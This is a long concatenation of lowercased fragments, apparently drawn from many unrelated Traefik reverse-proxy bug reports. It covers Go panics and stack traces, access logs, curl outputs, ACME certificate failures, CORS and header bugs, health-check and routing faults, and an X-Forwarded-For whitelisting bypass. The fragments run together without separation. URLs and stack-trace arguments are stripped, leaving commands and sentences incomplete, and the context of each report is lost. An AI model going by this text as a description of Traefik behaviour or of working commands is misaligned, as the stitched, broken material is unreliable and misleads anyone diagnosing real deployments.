time.(*timer).reset( , , ) /usr/local/go/src/time/sleep.go:126 +
github.com/containous/traefik/v2/pkg/udp.(*conn).read( , , , , , , ) /go/src/github.com/containous/traefik/pkg/udp/conn.go:233 +
io.copybuffer( , , , , , , , , , ) /usr/local/go/src/io/io.go:405 +
io.copy(...) /usr/local/go/src/io/io.go:364
github.com/containous/traefik/v2/pkg/udp.proxy.conncopy( , , , , , , ) /go/src/github.com/containous/traefik/pkg/udp/proxy.go:50 +
created by github.com/containous/traefik/v2/pkg/udp.(*proxy).serveudp /go/src/github.com/containous/traefik/pkg/udp/proxy.go:39 +
127.0.0.1 - - [13/mar/2020:18:49:07 +0000] "get /ping http/1.1" 200 2 "-" "-" 1 "ping@internal" - 0ms
``` note the `"-"` vs
`-` in the last field before the `request_duration_in_ms` field.
vary is missing or unmodified (if already present with another header).
create entrypoints for http and https.
traefik changed x-forwarded-proto from https to wss for a websocket connection (wss://)
other users of the cluster were unable to create / modify their ingressroute.
traefik comes online and the let's encrypt challenge/registration fails.
/entities/projects/some-namespace/some-project --> /entities/projects/some-namespace%252fsome-project
- when trying to do "externalname" approach with "ingressroute", traefik can\'t have "https scheme" resolved at the traefik router, for services that have port other than 443
my grpc service is running on port 5000 ( please check logs included at the end of this post )
- if i set the service `port` to 443 then `targetport` still at 5000, the "https schemes" does works, but ssl mechanism still does not work, i saw 502 response at traefik log
but if i have "ingressroute" definition to a service which the type is "clusterip" ( not using "externalname" ), any ports will still run with "https" scheme in traefik routes with it ip address
for example resolved as
currently, the only way to make it works is only by having "clusterip" type of service, which exposing ip address to traefik routing, then we make ip address of the service as cn (common name) which is not reliable ( could dynamically change in kubernetes) , instead of "service name" which is more reliable without depending on ip address.
--certificatesresolvers.**sample**.acme
in the enableing acme - single domain kubernetes: "tls: {}"
- multi domain kubernetes: "tls: {}"
- multi domain kubernetes: "tls: certresolve: le" ### what did you expect? consistent use of the certificateresolver name..
if it\'s "sample", then use that
in this ( branch, "le" is being changed to "myresolver"
so le, myresolve, sample..
having one through all of the documentation would be excellent
also, with the three single/multi/multi examples above, what is the field supposed to be? tls: {}? the 2.0 user guide: kubernetes and let\'s enrcypt use \'default\': "tls: certresolver: default" example: #traefik-routers ### questions? let me know..
i'm trying to get 2.0 with lets encrypt up and running in my own kubernetes cluster and wanted to pass along my findings as i struggle through my own cluster issues.
- the curl on http either - gets redirected to the https which answers a 404 not found with the default (incorrect) certificate - answers directly a 404, in which case a `curl ` answers the correct page with the correct certificate both possibilities change at random over time
- traefik dashboard shows only one router matching the rule `host("example.org") && pathprefix("/")` sometimes with tls support, sometimes without
i see traefik routing to the unhealthy service members.
internal server error
499 code for websocket requests
headers ```connection``` and ```upgrade``` are removed.
mvn deploy fails due to the above errors
`traefik_service_*` metrics have no vectors for rate limited requests.
every other routes works except dashboard.
in traefik2.1.3 this list keeps empty
![image]( but i see an entry under http services that say the right generated rule will be used by a router.
![image]( please ignore the fact that the name includes "ssl"
this is just the deployment name
service and ingress are tested on port 80.
'no providers found' on the dashboard.
error 500, as above
no matter what i do `traefik` is unable to get any config from redis
it either complains that it can't build the config because the key wasn't found (if the key starts with just `traefik`), or throws parsing errors (if it starts with `/traefik`)
i also described the issue here:
![image](
![screenshot 2020-01-20 at 21 07 01](
buffer middleware enabled -> 500
without buffer middleware -> 502/504 (it seems for http 1.1 requests 504, for http 2.0 requests 502)
the websites used the traefik default certificate, generated on container startup
taking a look into the traefik logs showed me failing dns challenges, the expected token could not be found in the dns txt record of my domain
taking a look into the internet accessible dns information (e.g
as [here]( #txt/_acme-challenge.staging.ceres.data-experts.net)) showed that the txt record was successfully created
the txt record looked for example as follows: ```
xb48qjfliz1x8pno0uirpebpapastxhzhywj1xgj0sq<br />nt-uahppsyv0bfcemgzqm1ujdonzfamcghfqignjwqa
``` traefik logged it was searching for `xb48qjfliz1x8pno0uirpebpapastxhzhywj1xgj0sq` (the first part of the txt record) but found `nt-uahppsyv0bfcemgzqm1ujdonzfamcghfqignjwqa` (the second part of the txt record after `<br />`) instead
for me this looks like the acme-dns provider just would have to check the correct part of the txt record to validate the domain.
traefik started returning 500 responses
the forwardauth 'address' endpoint continued to return 200's, but an error started occurring when any combination of middleware was provided: * `forwardauth.trustforwardheader` * `forwardauth.authresponseheaders` * `forwardauth.trustforwardheader` and `forwardauth.authresponseheaders` traefik log: ```
reverse-proxy_1 | time="2020-01-03t05:37:00z" level=debug msg="error calling
cause: get : unsupported protocol scheme \\"\\"" middlewarename=svc1-forwardauth-headers@docker middlewaretype=forwardedauthtype
``` ### output of `traefik version`: docker image ```
traefik:v2.1
new container starts with the same labels, so it goes as a second instance of the same service
first healthcheck on the new service fails, traefik "removes the instance from server list" (wording from logs).
the instance becomes available and replies 200 for the direct request on a healthcheck endpoint
traefik does not check it and the instance remains down forever
as a workaround, i changed the deployment script so that it checks the endpoint directly and stops the old instance once the new one is ok
when the instance remains only on in the service, it is healthchecked and fortunately becomes up
this is happens not every time, and i did not manage to determine the conditions to reproduce it
the only clue i noticed is possibly related to this #issuecomment-568782862 issue: - it works as expected if the first healthcheck runs twice
- it stucks if the first healthcheck runs only once
(according to logs) ### output of `traefik version`: ```
version: 2.1.1
codename: cantal
go version: go1.13.5
built: 2019-12-12t19:01:37z
os/arch: linux/amd64
traefik didn't reconnect to jaeger agent when it was available again.
i saw the stylesheet returned as text/plain, which will not load as valid css over https
an error message : ```
400 bad request
the plain http request was sent to https port
``` it seems that #5062 didn't help in that case.
the `x-forwarded-for` header was unset
other `x-forwarded-foo` headers were set, as was `x-real-ip`
notably, `x-forwarded-for` *is* set when passing any other http request to the backend.
a constant stream of warnings about the namespace "ingress" being ignored.
```dec 13 12:10:40 www-neu traefik[11728]: time="2019-12-13t11:10:40z" level=debug msg="provider connection established with docker 19.03.5 (api 1.40)" providername=docker
dec 13 12:10:40 www-neu traefik[11728]: time="2019-12-13t11:10:40z" level=error msg="error in go routine: runtime error: index out of range [0] with length 0"
dec 13 12:10:40 www-neu traefik[11728]: time="2019-12-13t11:10:40z" level=error msg="stack: goroutine 62 [running]:\ runtime/debug.stack( , , )\ \\t/usr/local/go/src/runtime/debug/stack.go:24 + \ github.com/containous/traefik/v2/pkg/safe.defaultrecovergoroutine( , )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:160 + \ github.com/containous/traefik/v2/pkg/safe.operationwithrecover.func1.1( )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:168 + \ panic( , )\ \\t/usr/local/go/src/runtime/panic.go:679 + \ github.com/containous/traefik/v2/pkg/config/parser.decodetonode( , , , , , , , , )\ \\t/go/src/github.com/containous/traefik/pkg/config/parser/labels_decode.go:24 + \ github.com/containous/traefik/v2/pkg/config/parser.decode( , , , , , , , , , )\ \\t/go/src/github.com/containous/traefik/pkg/config/parser/parser.go:11 + \ github.com/containous/traefik/v2/pkg/config/label.decodeconfiguration( , , , )\ \\t/go/src/github.com/containous/traefik/pkg/config/label/label.go:16 + \ github.com/containous/traefik/v2/pkg/provider/docker.(*provider).buildconfiguration( , , , , , , )\ \\t/go/src/github.com/containous/traefik/pkg/provider/docker/config.go:31 + \ github.com/containous/traefik/v2/pkg/provider/docker.(*provider).provide.func1.1( , )\ \\t/go/src/github.com/containous/traefik/pkg/provider/docker/docker.go:193 + \ github.com/containous/traefik/v2/pkg/safe.operationwithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:172 + \ github.com/cenkalti/backoff/v3.retrynotify( , , , , , )\ \\t/go/pkg/mod/github.com/cenkalti/backoff/v3@v3.0.0/retry.go:37 + \ github.com/containous/traefik/v2/pkg/provider/docker.(*provider).provide.func1( , )\ \\t/go/src/github.com/containous/traefik/pkg/provider/docker/docker.go:293 + \ github.com/containous/traefik/v2/pkg/safe.(*pool).goctx.func1()\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:63 + \ github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:153 + \ created by github.com/containous/traefik/v2/pkg/safe.gowithrecover\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + \ "
dec 13 12:10:40 www-neu traefik[11728]: time="2019-12-13t11:10:40z" level=error msg="provider connection error panic in operation: %!s(<nil>), retrying in 14.398432638s" providername=docker
### traefik version traefik: v2.1.0(v2.1.0-rc3 is ok)
curl -s | grep get
<pre>cannot get /app</pre>
with a 404 status code
but, request on ` ` (notice the additional `/` at end) give a 200 with expected response
### traefik version in kubernetes, installed with helm chart stable/traefik v1.82.3 ```
traefik-helm: traefik:1.7.19
![image](
it just retries every 1 second until i stop traefik
not working because acme puts out error in tls-apn-01 challenge
fatal error: powerregistersuspendresumenotification failure runtime stack:
runtime.throw( , ) /usr/local/go/src/runtime/panic.go:774 + fp= sp= pc=
runtime.monitorsuspendresume() /usr/local/go/src/runtime/os_windows.go:294 + fp= sp= pc=
runtime.goenvs() /usr/local/go/src/runtime/os_windows.go:531 + fp= sp= pc=
runtime.schedinit() /usr/local/go/src/runtime/proc.go:554 + fp= sp= pc=
runtime.rt0_go( , , , , , , , , , , ...) /usr/local/go/src/runtime/asm_amd64.s:214 + fp= sp= pc=
![screenshot from 2019-12-08 00-49-29](
error "fatal error: concurrent map writes" and traefik crashed after few minutes.
traefik.service.request.duration:1.055487|ms
traefik.entrypoint.request.duration:1.058461|ms
traefik dutifully routes traffic to backends with critical healthchecks
$ curl localhost:80 -h 'host: broken.dev.local' -x get -i
http/1.1 502 bad gateway
date: wed, 27 nov 2019 16:04:46 gmt
content-length: 11
content-type: text/plain; charset=utf-8
``` ![screen shot 2019-11-27 at 11 04 42 am](
note that this does not happen every time
the steps may need to be repeated a few times to trigger the bug
when it does trigger, traefik continues to respond with 503 even after the logs indicate that the pod being available has been communicated to it by kubernetes
i've also seen it successfully serve requests and then remove the pod from load balancing
for example this result of requesting the health status of the application while triggering the bug: it starts by the application in the pod responding that it is healthy
then it is made ill (by the commands above)
at this point it is not considered unready by kubernetes and continues to serve requests
after about 11 seconds the application is switched back to healthy
shortly after that traefik responds with service unavailable
it will continue with service unavailable until i trigger another readiness change or restart traefik
<details> ```
wed nov 27 11:49:29 gmt 2019
wed nov 27 11:49:30 gmt 2019
wed nov 27 11:49:31 gmt 2019
wed nov 27 11:49:32 gmt 2019
wed nov 27 11:49:33 gmt 2019
wed nov 27 11:49:34 gmt 2019
wed nov 27 11:49:35 gmt 2019
wed nov 27 11:49:36 gmt 2019
wed nov 27 11:49:37 gmt 2019
wed nov 27 11:49:38 gmt 2019
wed nov 27 11:49:39 gmt 2019
wed nov 27 11:49:40 gmt 2019
wed nov 27 11:49:41 gmt 2019
wed nov 27 11:49:42 gmt 2019
wed nov 27 11:49:44 gmt 2019
wed nov 27 11:49:45 gmt 2019
wed nov 27 11:49:46 gmt 2019
service unavailable
wed nov 27 11:49:47 gmt 2019
service unavailable
wed nov 27 11:49:48 gmt 2019
service unavailable
wed nov 27 11:49:49 gmt 2019
service unavailable
wed nov 27 11:49:50 gmt 2019
service unavailable
wed nov 27 11:49:51 gmt 2019
service unavailable
certificatesresolvers.http.acme.httpchallenge does not override other middleware.
receive `405 method not allowed` because my backend does not implement the method, i was expecting traefik to respond to the request
i notice that my request does not send `access-control-request-headers` and you're verifying if it exists before consider it a preflight request #l227
new container not being picked up by traefik and received a service unavailable error when trying to navigate to the container label host.
``` info[0000] configuration loaded from file: /etc/traefik/traefik.toml bad healthcheck status: 404 not found
:8082 of course is available
tried checking it with wget -s 127.0.0.1:8082/ping and got 200 ok
only one node being registered as a server.
traefik serves **two** certificates, one matching my host of the ingress path and also a non sni certificate with subject **traefik default cert**
this one was hard to catch because i guess **most of the time** browsers such as firefox, safari and chrome latest version are able to figure out what certificate to pick from the ones traefik serves via tls and ignore the unmatching non sni default cert, however, the same browsers some time stutter and pick the wrong one which is why some users sometimes see a page flagged as non-secure.
x-b3-traceid: 04b03a264f5ae470241e7619143ef228
traefik crashed.
=== run testcommonlogformatter_format
=== run testcommonlogformatter_format/originstatus_&_origincontentsize_are_nil
=== pause testcommonlogformatter_format/originstatus_&_origincontentsize_are_nil
=== run testcommonlogformatter_format/all_data
=== pause testcommonlogformatter_format/all_data
=== run testcommonlogformatter_format/all_data_with_local_time
=== pause testcommonlogformatter_format/all_data_with_local_time
=== cont testcommonlogformatter_format/originstatus_&_origincontentsize_are_nil
=== cont testcommonlogformatter_format/all_data_with_local_time
=== cont testcommonlogformatter_format/all_data
--- fail: testcommonlogformatter_format (0.00s) --- pass: testcommonlogformatter_format/originstatus_&_origincontentsize_are_nil (0.00s) --- pass: testcommonlogformatter_format/all_data (0.00s) --- fail: testcommonlogformatter_format/all_data_with_local_time (0.06s) logger_formatters_test.go:99: error trace: logger_formatters_test.go:99 error: not equal: expected: "10.0.0.1 - client [10/nov/2009:14:00:00 -0900] \\"get /foo http\\" 123 132 \\"referer\\" \\"agent\\" - \\"foo\\" \\" " 123000ms\ " actual : "10.0.0.1 - client [11/nov/2009:07:00:00 +0800] \\"get /foo http\\" 123 132 \\"referer\\" \\"agent\\" - \\"foo\\" \\" " 123000ms\ " diff: --- expected +++ actual @@ -1,2 +1,2 @@ -10.0.0.1 - client [10/nov/2009:14:00:00 -0900] "get /foo http" 123 132 "referer" "agent" - "foo" " " 123000ms +10.0.0.1 - client [11/nov/2009:07:00:00 +0800] "get /foo http" 123 132 "referer" "agent" - "foo" " " 123000ms test: testcommonlogformatter_format/all_data_with_local_time <click to see difference> fail
in addition, we spotted we were now able to access protected resources from anywhere
at this point, allow me to elaborate
we have a vpc with an _internal_ alb
traffic from the outside world is routed in via a global accelerator
we use ecs a lot, so applied docker labels to containers to advertise themselves and apply source range whitelisting with x-forwarded-for headers
initially, this worked fine to allow private access from say our office ip
but then we realised we have "sibling" resources within the vpc also needing to make connections so added our private ip cidr range and asked the clients to reach us via the alb
this, too, worked
but, and here is the crux of this ticket: it seems by switching on x-forwarded-for, we are not asking traefik to *only* examine x-forwarded-for, but add the x-forwarded-for headers to the source addresses of the traffic being inspected
if only the x-forwarded-for headers where used, traffic from foreign parties would never match, but because it's additive the alb's own source ip addresses match too
perhaps explain in the documentation that source range is always the source of the tcp transmission, and that switching on x-forwarded-for adds to this address, and does not replace them.
broken image indicator from browser instead of a provider icon.
![dc4d5fcd-f3a8-4632-88cc-0af2e227dbf8](
![bug2](
traefik change makes it rewrite the `location` header if traefik is running in ssl mode and the url in the header is not https
### what this was supposed to fix the change was meant to reduce the number of redirects so that the http client immediately receives an https location
for example, if the `location` header contains location: it correctly rewrites this to location: ### what the change broke as collateral damage if the location header contains a port, it should not do the rewrite (or know which port to substitute.) for example, the following should not be rewritten: location: it should also not rewrite the header if the url refers to a different server altogether: location: as there may not be an https server at `other.company.site`.
i can reproduce it also with traefik.
traefik does not close the connection after waiting for configured time
{"level":"error","msg":"error in go routine: runtime error: invalid memory address or nil pointer dereference","time":"2019-10-30t19:16:00z"}
{"level":"error","msg":"stack: goroutine 72 [running]:\ runtime/debug.stack( , , )\ \\t/usr/local/go/src/runtime/debug/stack.go:24 + \ github.com/containous/traefik/v2/pkg/safe.defaultrecovergoroutine( , )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:160 + \ github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1.1( )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:150 + \ panic( , )\ \\t/usr/local/go/src/runtime/panic.go:679 + \ github.com/containous/traefik/v2/pkg/metrics.onconfigurationupdate( , , , )\ \\t/go/src/github.com/containous/traefik/pkg/metrics/prometheus.go:232 + \ github.com/containous/traefik/v2/pkg/server.(*server).loadconfiguration( , , , )\ \\t/go/src/github.com/containous/traefik/pkg/server/server_configuration.go:59 + \ github.com/containous/traefik/v2/pkg/server.(*server).listenconfigurations( , )\ \\t/go/src/github.com/containous/traefik/pkg/server/server_configuration.go:249 + \ github.com/containous/traefik/v2/pkg/server.(*server).start.func3( )\ \\t/go/src/github.com/containous/traefik/pkg/server/server.go:183 + \ github.com/containous/traefik/v2/pkg/safe.(*pool).go.func1()\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:90 + \ github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:153 + \ created by github.com/containous/traefik/v2/pkg/safe.gowithrecover\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + \ ","time":"2019-10-30t19:16:00z"} ```
a 404 from traefik
![screencapture-localhost-8080-dashboard-1571740660919](
$ kubectl top pods
name cpu(cores) memory(bytes) traefik-5c85c4c558-64lhf 123m 15mi traefik-5c85c4c558-nmqgw 156m 15mi ```
out of the 140 pods currently running, here is the last hour of traffic, sorted by traefk endpoint url ![screenshot from 2019-10-18 06-12-32]( this happens on all our routes, here is another endpoint with 25 pods in the service.
![screenshot from 2019-10-18 06-14-25](
memory leak/now after one hour after restarting traefik it already consums 24gb of memory
errors in the log `level=error msg="opentracing: invalid inject/extract carrier"`
i see a connect dial tcp error that ` ` cannot be reached
setting the region skips that code and traefik starts serving requests.
traefik starting with a static configuration loaded that includes ` ` as caserver.
![screenshot_85](
midlleware error: tls certificate or key file must be set when tls configuration is created
a integer overflow which is fixed with lego 3.1.0
- ingress controller has stopped routing as traefik backend/frontend services are broken
- traefik has removed the backend and frontend services entry from the dashboard
- end users are getting error 404
- below error in the traefik logs
failed to create fractional weight allocator for ingress <xyz>/<zbc>: the sum of weights(99.999%) in the path / must be 100% when no omitted fractional service left"
traefik ignores any changes
a restart is necessary to apply changes in `dynamic.toml`
see above, them not coming through
note that this is only issue with the dashboard
the headers do come through for other services as can be demonstrated by commenting out the first `traefik.enable=true` and uncommenting the second
some more discussion here:
access-control-allow-origin:
access-control-allow-origin: *
(the header inserted by traefik does not replace the header sent by the application, this results in an invalid cors configuration)
if `*` is used as the value of `accesscontrolalloworigin`, the response contains two headers with the same value, which is also rejected by the browser.
access-control-allow-origin: *
access-control-allow-origin: *
``` if `null` is used, nothing happens (the documentation suggests null is valid, but this has been removed from the code - presumably for security reasons)
the tls settings are ignored and default options are applied instead
checking the settings using confirm that neither tls version, nor cipher suites are restricted as specified
when enabling debug level in traefik, i see this log statement:
``` time="2019-10-02t11:02:47+02:00" level=debug msg="invalid ciphersuite: tls_ecdhe_ecdsa_with_chacha20_poly1305_sha256" entrypointname=https routername=myservice@docker
``` this leads me to the conclusion that if one of the listed cipher suites is not available, traefik silently ignores the complete tls option instead of just ignoring the unavailable cipher suite or raising an error
especially the behaviour of falling back to default tls settings feels like a security flaw to me.
whatever is last in the middleware list completely overrides all possible headers from previous middlewares, even if i didn't specify them
in the above example, `customframeoptionsvalue: sameorigin` is not applied: ```
accept-ranges: bytes
content-length: 69
content-type: text/plain
date: sat, 28 sep 2019 18:17:43 gmt
etag: "5d8f979b-45"
last-modified: sat, 28 sep 2019 17:25:47 gmt
server: nginx
status: 200
strict-transport-security: max-age=31536010; includesubdomains; preload
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
as you can see, `x-frame-options: sameorigin` is missing.
an unsuccessful connection.
according my service logs i see only next headers
{[accept, */*]} {[accept-encoding, gzip]} {[host, mypc:451]} {[user-agent, curl/7.66.0]} {[x-forwarded-for, fe80::9d41:b671:ba7b:31c0%npcap loopback adapter]} {[x-forwarded-host, mypc:451]} {[x-forwarded-port, 451]} {[x-forwarded-proto, https]} {[x-forwarded-server, shcheglovitov-i]} {[x-real-ip, fe80::9d41:b671:ba7b:31c0]}
only traefik
level=warning msg="could not retrieve canonizedhost, rejecting "
unhealthy loadbalancer, and just ip address of server
cpu spins to 100% and dashboard didn't work returning many 502 errors: ```
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3070 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5112ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3069 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5115ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3068 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5119ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3067 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5122ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3066 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5125ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3065 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5129ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3064 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5143ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3063 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5146ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3062 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5151ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3061 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5156ms
kube-system traefik-ingress-controller-6bc6bf649b-ksv8f traefik-ingress-lb 10.244.0.64 - - [23/sep/2019:15:31:52 +0000] "get / http/1.1" 502 11 "-" "-" 3060 "traefik-192-168-15-16-nip-io-@kubernetes" " " 5161ms
``` after adding api.insecure=true, dashboard works (without the 502 errors) but cpu still on 100%.
when loading webpages through traefik not all objects are rendered, i.e
images or css.
getting heimdall, sometimes images are missing: ![image]( hitting f5 get different behaviour, but always not rendering everything: ![image]( but hitting ctrl+f5 in order to force a full refresh from website get a correct render of the page
this is happening with all the backends (heimdall is only an example) and with every web browsers.
going back to version 1.7.14 fix the issue
this is happening also with version 1.7.15
after a few days of uptime, i am observing traefik sending 503 in spite of the fact that the backend servers are up and running with health check returning 200 ok as a basic validation step, i connected to the same backend servers from **another** traefik instance to confirm the health of backend servers
a white page, because assets are loaded with an absolute path.
`/mnt` was empty
authentication error
rating went down from a+ to b because traefik suddenly starts to support sslv3
![image](
normal https via traefik works fine, but websocket upgrades do not work
directly accessing the backend via http also works with websockets
the chrome console shows the following error: ````
websocket connection to 'wss://...' failed: error during websocket handshake: incorrect 'sec-websocket-accept' header value
errors in the log (pasted like code to preserve wildcard characters): ```
time="2019-09-06t22:50:02z" level=error msg="unable to obtain acme certificate for domains \\"*.domain.com,domain.com\\" : unable to generate a certificate for the domains [*.domain.com domain.com]: acme: error -> one or more domains had a problem:\ [*.domain.com] [*.domain.com] acme: error presenting token: cloudflare: failed to create txt record: error from makerequest: http status 400: content \\"{\\\\\\"success\\\\\\":false,\\\\\\"errors\\\\\\":[{\\\\\\"code\\\\\\":81057,\\\\\\"message\\\\\\":\\\\\\"the record already exists.\\\\\\"}],\\\\\\"messages\\\\\\":[],\\\\\\"result\\\\\\":null}\\"\ [domain.com] [domain.com] acme: error presenting token: cloudflare: failed to create txt record: error from makerequest: http status 400: content \\"{\\\\\\"success\\\\\\":false,\\\\\\"errors\\\\\\":[{\\\\\\"code\\\\\\":81057,\\\\\\"message\\\\\\":\\\\\\"the record already exists.\\\\\\"}],\\\\\\"messages\\\\\\":[],\\\\\\"result\\\\\\":null}\\"\ " providername=domain.acme time="2019-09-06t22:50:10z" level=error msg="unable to obtain acme certificate for domains \\"*.domain.com,domain.com\\" : unable to generate a certificate for the domains [*.domain.com domain.com]: acme: error -> one or more domains had a problem:\ [*.domain.com] acme: error: 403 :: post :: :: urn:ietf:params:acme:error:ordernotready :: order\'s status (\\"deactivated\\") is not acceptable for finalization, url: \ [domain.com] acme: error: 403 :: post :: :: urn:ietf:params:acme:error:ordernotready :: order\'s status (\\"deactivated\\") is not acceptable for finalization, url: \ " providername=domain.acme
test case 1
i see error: `curl: (56) openssl ssl_read: error:14094412:ssl routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0`, as expected
test case 2: browser shows me `meow.example.com` page **without** *err_bad_ssl_client_auth_cert* error
with headers
there is no header `x-forwarded-tls-client-cert` with client certificate.
traefik is using 100% cpu and memory grows.
i routed a domain to traefik dashboard
when i visit the dashboard it's normal and nothing happens
visiting `/api/rawdata` url causes this.
an error during marshall with the private key included
shared/traefik.log:time="2019-08-27t14:32:48z" level=warning msg="error checking new version: baseurl must have a trailing slash, but \\" " does not"
a crashloopback pod status, `kubectl logs [traefik pod name]` returned:
`command traefik error: failed to decode configuration from flags: field not found, node: entrypoint`
service still available, `serverstatus` in `/api/rawdata` still `up`
traefik was expecting the _acme-challenge.api.xxxxxxxx.xx record in the azure dns zone and did not generate a wildcard certificate.
502 gateway error from cloudflare this is because plex, emby, and other apps use a self signed cert over https and there's no way to stop that
so in 1.7, insecureskipverify=true solves the self signed cert issue on the backend.
a redirect to ` ` ```
curl -v -k -6 '
* trying 2a02:168:xx::xx:80...
* tcp_nodelay set
* connected to 2a02:168:xx::42 (2a02:168:xx::xx) port 80 (#0)
> get /traefik/ http/1.1
> host: [2a02:168:xx::xx]> user-agent: curl/7.65.3
> accept: */*
> * mark bundle as not supporting multiuse
< http/1.1 302 found
< location:
< date: tue, 13 aug 2019 06:53:22 gmt
< content-length: 5
< content-type: text/plain; charset=utf-8< * connection #0 to host 2a02:168:xx::42 left intact
whatever object you fetch you will always get the content of /
$ curl -i -h "host: phpmyadmin.dev.example.com"
http/2 200 cache-control: no-store, no-cache, must-revalidate, pre-check=0, post-check=0, max-age=0
content-security-policy: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data: *.tile.openstreetmap.org;object-src 'none';
content-type: text/html; charset=utf-8
date: thu, 08 aug 2019 09:09:24 gmt
expires: thu, 08 aug 2019 09:09:24 +0000
last-modified: thu, 08 aug 2019 09:09:24 +0000
pragma: no-cache
referrer-policy: no-referrer
server: apache/2.4.39 (unix) openssl/1.1.0k php/7.3.7
set-cookie: phpmyadmin=xxxxxxxxxxxxxxxxxxxxxx; path=/; secure; httponly
set-cookie: phpmyadmin=xxxxxxxxxxxxxxxxxxxxxx; path=/; secure; httponly
set-cookie: pma_lang=en; expires=sat, 07-sep-2019 09:09:24 gmt; max-age=2592000; path=/; secure; httponly
set-cookie: phpmyadmin=yyyyyyyyyyyyyyyyyyyyyy; path=/; secure; httponly
vary: accept-encoding
vary: accept-encoding
x-content-security-policy: default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data: *.tile.openstreetmap.org;object-src 'none';
x-content-type-options: nosniff
x-frame-options: deny
x-ob_mode: 1
x-permitted-cross-domain-policies: none
x-powered-by: php/7.3.7
x-robots-tag: noindex, nofollow
x-webkit-csp: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data: *.tile.openstreetmap.org;object-src 'none';
x-xss-protection: 1; mode=block
vs (i have manually removed the rewrite-target config)
$ curl -i -h "host: phpmyadmin.dev.example.com"
accept-ranges: bytes
content-type: text/css
date: thu, 08 aug 2019 09:39:43 gmt
etag: "bb7-58a842e244b80"
last-modified: tue, 04 jun 2019 19:06:38 gmt
server: apache/2.4.39 (unix) openssl/1.1.0k php/7.3.7
vary: accept-encoding
vary: accept-encoding
content-length: 2999
2019/08/07 10:51:34 frame.go:388: http2: framer : wrote ping flags=ack len=8 ping="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
2019/08/07 10:51:38 frame.go:514: http2: framer : read ping len=8 ping="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
2019/08/07 10:51:38 transport.go:2391: http2: transport received ping len=8 ping="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
2019/08/07 10:51:38 frame.go:388: http2: framer : wrote ping flags=ack len=8 ping="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
2019/08/07 10:51:42 frame.go:514: http2: framer : read ping len=8 ping="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
2019/08/07 10:51:42 transport.go:2391: http2: transport received ping len=8 ping="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
``` i see that only fraefik receives ping frames and doesn't forwards them to original client
this is a problem for production environments when you have mobile clients with long lived rpc streams and in case when client lost it's internet connection grpc server should be able to detect that client connection was lost.
an error while talking to the dns provider ### output of `traefik version`: 1.7.12 <!--
for the traefik docker image: docker run [image] version ex: docker run traefik version for the alpine traefik docker image: docker run [image] traefik version ex: docker run traefik traefik version
